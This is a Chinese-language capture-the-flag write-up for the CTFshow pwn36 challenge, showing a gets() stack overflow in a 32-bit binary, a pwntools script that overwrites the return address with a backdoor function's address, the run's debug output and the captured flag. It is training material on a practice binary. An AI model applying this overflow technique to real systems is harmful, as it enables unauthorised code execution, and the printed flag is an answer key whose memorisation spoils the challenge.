```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn36
```

```
tasike@tasike-VM:~/Desktop$ file pwn36
pwn36: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d446777ba8d7ce8f2759bdafb915b037f2380a33, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn36
[*] '/home/tasike/Desktop/pwn36'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

有可读可写可执行的栈区，因此可以考虑shellcode或者后门函数之类

ida查看：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts(asc_804883C);
  puts(asc_80488B0);
  puts(asc_804892C);
  puts(asc_80489B8);
  puts(asc_8048A48);
  puts(asc_8048ACC);
  puts(asc_8048B60);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : There are backdoor functions here!                      ");
  puts("    * *************************************                           ");
  puts("Find and use it!");
  puts("Enter what you want: ");
  ctfshow(&argc);
  return 0;
}
```

跟进`ctfshow`

```c
char *ctfshow()
{
  char s[36]; // [esp+0h] [ebp-28h] BYREF
  return gets(s);
}
```

从左侧Functions中发现后门函数：
```c
int get_flag()
{
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  return printf(s);
}
```

只需通过`ctfshow`里的`gets`溢出，将返回地址覆写为`get_flag`的地址就行。



==下面是演示==：

编写`attack36.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28231)
payload = cyclic(0x28 + 0x4) + p32(0x08048586);
r.sendline(payload)
r.interactive()
```

运行攻击脚本：
```
tasike@tasike-VM:~/Desktop$ python3 attack36.py
[+] Opening connection to pwn.challenge.ctf.show on port 28231: Done
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  86 85 04 08  │iaaa│jaaa│kaaa│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
[DEBUG] Received 0x564 bytes:
    00000000  20 20 20 20  e2 96 84 e2  96 84 e2 96  84 e2 96 84  │    │····│····│····│
    00000010  20 20 20 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │   ·│····│····│····│
    00000020  96 84 e2 96  84 e2 96 84  e2 96 84 20  20 e2 96 84  │····│····│··· │ ···│
    00000030  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 84 e2  │····│····│····│····│
    00000040  96 84 e2 96  84 20 20 20  20 20 20 20  20 20 20 20  │····│·   │    │    │
    00000050  20 e2 96 84  e2 96 84 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000070  20 20 0a 20  20 e2 96 88  e2 96 88 e2  96 80 e2 96  │  · │ ···│····│····│
    00000080  80 e2 96 80  e2 96 80 e2  96 88 20 20  e2 96 80 e2  │····│····│··  │····│
    00000090  96 80 e2 96  80 e2 96 88  e2 96 88 e2  96 80 e2 96  │····│····│····│····│
    000000a0  80 e2 96 80  20 20 e2 96  88 e2 96 88  e2 96 80 e2  │····│  ··│····│····│
    000000b0  96 80 e2 96  80 e2 96 80  e2 96 80 e2  96 80 20 20  │····│····│····│··  │
    000000c0  20 20 20 20  20 20 20 20  20 20 e2 96  88 e2 96 88  │    │    │  ··│····│
    000000d0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000000e0  20 20 20 20  20 20 20 20  20 20 20 0a  20 e2 96 88  │    │    │   ·│ ···│
    000000f0  e2 96 88 e2  96 80 20 20  20 20 20 20  20 20 20 20  │····│··  │    │    │
    00000100  e2 96 88 e2  96 88 20 20  20 20 20 e2  96 88 e2 96  │····│··  │   ·│····│
    00000110  88 20 20 20  20 20 20 20  20 e2 96 84  e2 96 84 e2  │·   │    │ ···│····│
    00000120  96 88 e2 96  88 e2 96 88  e2 96 88 e2  96 88 e2 96  │····│····│····│····│
    00000130  84 20 20 e2  96 88 e2 96  88 e2 96 84  e2 96 88 e2  │·  ·│····│····│····│
    00000140  96 88 e2 96  88 e2 96 88  e2 96 84 20  20 20 e2 96  │····│····│··· │  ··│
    00000150  84 e2 96 88  e2 96 88 e2  96 88 e2 96  88 e2 96 84  │····│····│····│····│
    00000160  20 20 e2 96  88 e2 96 88  20 20 20 20  20 20 e2 96  │  ··│····│    │  ··│
    00000170  88 e2 96 88  0a 20 e2 96  88 e2 96 88  20 20 20 20  │····│· ··│····│    │
    00000180  20 20 20 20  20 20 20 e2  96 88 e2 96  88 20 20 20  │    │   ·│····│·   │
    00000190  20 20 e2 96  88 e2 96 88  e2 96 88 e2  96 88 e2 96  │  ··│····│····│····│
    000001a0  88 e2 96 88  e2 96 88 20  20 20 e2 96  88 e2 96 88  │····│··· │  ··│····│
    000001b0  e2 96 84 e2  96 84 e2 96  84 e2 96 84  20 e2 96 80  │····│····│····│ ···│
    000001c0  20 20 e2 96  88 e2 96 88  e2 96 80 20  20 20 e2 96  │  ··│····│··· │  ··│
    000001d0  88 e2 96 88  20 20 e2 96  88 e2 96 88  e2 96 80 20  │····│  ··│····│··· │
    000001e0  20 e2 96 80  e2 96 88 e2  96 88 20 e2  96 80 e2 96  │ ···│····│·· ·│····│
    000001f0  88 20 20 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │·  ·│····│·  ·│····│
    00000200  80 0a 20 e2  96 88 e2 96  88 e2 96 84  20 20 20 20  │·· ·│····│····│    │
    00000210  20 20 20 20  20 20 e2 96  88 e2 96 88  20 20 20 20  │    │  ··│····│    │
    00000220  20 e2 96 88  e2 96 88 20  20 20 20 20  20 20 20 20  │ ···│··· │    │    │
    00000230  e2 96 80 e2  96 80 e2 96  80 e2 96 80  e2 96 88 e2  │····│····│····│····│
    00000240  96 88 e2 96  84 20 20 e2  96 88 e2 96  88 20 20 20  │····│·  ·│····│·   │
    00000250  20 e2 96 88  e2 96 88 20  20 e2 96 88  e2 96 88 20  │ ···│··· │ ···│··· │
    00000260  20 20 20 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │   ·│····│·  ·│····│
    00000270  88 e2 96 84  e2 96 88 e2  96 88 e2 96  84 e2 96 88  │····│····│····│····│
    00000280  e2 96 88 20  0a 20 20 e2  96 88 e2 96  88 e2 96 84  │··· │·  ·│····│····│
    00000290  e2 96 84 e2  96 84 e2 96  84 e2 96 88  20 20 20 20  │····│····│····│    │
    000002a0  20 e2 96 88  e2 96 88 20  20 20 20 20  e2 96 88 e2  │ ···│··· │    │····│
    000002b0  96 88 20 20  20 20 20 20  20 20 e2 96  88 e2 96 84  │··  │    │  ··│····│
    000002c0  e2 96 84 e2  96 84 e2 96  84 e2 96 84  e2 96 88 e2  │····│····│····│····│
    000002d0  96 88 20 20  e2 96 88 e2  96 88 20 20  20 20 e2 96  │··  │····│··  │  ··│
    000002e0  88 e2 96 88  20 20 e2 96  80 e2 96 88  e2 96 88 e2  │····│  ··│····│····│
    000002f0  96 84 e2 96  84 e2 96 88  e2 96 88 e2  96 80 20 20  │····│····│····│··  │
    00000300  e2 96 80 e2  96 88 e2 96  88 20 20 e2  96 88 e2 96  │····│····│·  ·│····│
    00000310  88 e2 96 80  20 0a 20 20  20 20 e2 96  80 e2 96 80  │····│ ·  │  ··│····│
    00000320  e2 96 80 e2  96 80 20 20  20 20 20 20  e2 96 80 e2  │····│··  │    │····│
    00000330  96 80 20 20  20 20 20 e2  96 80 e2 96  80 20 20 20  │··  │   ·│····│·   │
    00000340  20 20 20 20  20 20 e2 96  80 e2 96 80  e2 96 80 e2  │    │  ··│····│····│
    00000350  96 80 e2 96  80 e2 96 80  20 20 20 e2  96 80 e2 96  │····│····│   ·│····│
    00000360  80 20 20 20  20 e2 96 80  e2 96 80 20  20 20 20 e2  │·   │ ···│··· │   ·│
    00000370  96 80 e2 96  80 e2 96 80  e2 96 80 20  20 20 20 20  │····│····│··· │    │
    00000380  e2 96 80 e2  96 80 20 20  e2 96 80 e2  96 80 20 20  │····│··  │····│··  │
    00000390  0a 20 20 20  20 2a 20 2a  2a 2a 2a 2a  2a 2a 2a 2a  │·   │ * *│****│****│
    000003a0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    000003b0  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  20 20 20 20  │****│****│****│    │
    000003c0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000003d0  20 20 20 20  20 20 20 0a  20 20 20 20  2a 20 43 6c  │    │   ·│    │* Cl│
    000003e0  61 73 73 69  66 79 3a 20  43 54 46 73  68 6f 77 20  │assi│fy: │CTFs│how │
    000003f0  2d 2d 2d 20  50 57 4e 20  2d 2d 2d 20  e5 85 a5 e9  │--- │PWN │--- │····│
    00000400  97 a8 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │··  │    │    │    │
    00000410  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000420  0a 20 20 20  20 2a 20 54  79 70 65 20  20 3a 20 53  │·   │ * T│ype │ : S│
    00000430  74 61 63 6b  5f 4f 76 65  72 66 6c 6f  77 20 20 20  │tack│_Ove│rflo│w   │
    00000440  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000460  20 20 20 20  20 20 20 0a  20 20 20 20  2a 20 53 69  │    │   ·│    │* Si│
    00000470  74 65 20 20  3a 20 68 74  74 70 73 3a  2f 2f 63 74  │te  │: ht│tps:│//ct│
    00000480  66 2e 73 68  6f 77 2f 20  20 20 20 20  20 20 20 20  │f.sh│ow/ │    │    │
    00000490  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000004a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 0a 20  │    │    │    │  · │
    000004b0  20 20 20 2a  20 48 69 6e  74 20 20 3a  20 54 68 65  │   *│ Hin│t  :│ The│
    000004c0  72 65 20 61  72 65 20 62  61 63 6b 64  6f 6f 72 20  │re a│re b│ackd│oor │
    000004d0  66 75 6e 63  74 69 6f 6e  73 20 68 65  72 65 21 20  │func│tion│s he│re! │
    000004e0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000004f0  20 20 20 20  20 0a 20 20  20 20 2a 20  2a 2a 2a 2a  │    │ ·  │  * │****│
    00000500  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  2a 2a 2a 2a  │****│****│****│****│
    *
    00000520  2a 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │*   │    │    │    │
    00000530  20 20 20 20  20 20 20 20  20 20 20 20  0a 46 69 6e  │    │    │    │·Fin│
    00000540  64 20 61 6e  64 20 75 73  65 20 69 74  21 0a 45 6e  │d an│d us│e it│!·En│
    00000550  74 65 72 20  77 68 61 74  20 79 6f 75  20 77 61 6e  │ter │what│ you│ wan│
    00000560  74 3a 20 0a                                         │t: ·│
    00000564
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Stack_Overflow                                          
    * Site  : https://ctf.show/                                       
    * Hint  : There are backdoor functions here!                      
    * *************************************                           
Find and use it!
Enter what you want: 
[DEBUG] Received 0x2e bytes:
    b'ctfshow{14e6d0b7-7aab-414a-824d-b2c4987ddaf4}\n'
ctfshow{14e6d0b7-7aab-414a-824d-b2c4987ddaf4}
[*] Got EOF while reading in interactive
$  
```



